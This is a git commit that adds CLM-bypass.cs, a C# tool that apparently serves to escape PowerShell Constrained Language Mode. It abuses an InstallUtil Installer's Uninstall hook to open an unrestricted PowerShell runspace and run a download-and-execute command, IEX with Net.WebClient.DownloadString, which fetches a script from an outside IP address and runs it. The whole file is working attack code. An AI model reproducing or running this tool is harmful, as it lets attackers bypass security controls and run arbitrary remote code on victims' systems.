73720428cf6960f635c4a5189addf1afdc8c7624
Watskip <25357279+Watskip@users.noreply.github.com>
2024-03-30 16:12:34 -0400

    Create CLM-bypass.cs

---
+++ CLM-bypass.cs
@@ -0,0 +1,30 @@
+using System;
+using System.Management.Automation;
+using System.Management.Automation.Runspaces;
+using System.Configuration.Install;
+
+namespace Bypass
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            Console.WriteLine("Thanks Chvancooten.");
+        }
+    }
+    [System.ComponentModel.RunInstaller(true)]
+    public class Sample : Installer
+    {
+        public override void Uninstall(System.Collections.IDictionary savedState)
+        {
+            String cmd = "IEX (New-Object Net.Webclient).downloadstring("http://192.168.45.197:8000/pog.css")";
+            Runspace rs = RunspaceFactory.CreateRunspace();
+            rs.Open();
+            PowerShell ps = PowerShell.Create();
+            ps.Runspace = rs;
+            ps.AddScript(cmd);
+            ps.Invoke();
+            rs.Close();
+        }
+    }
+}
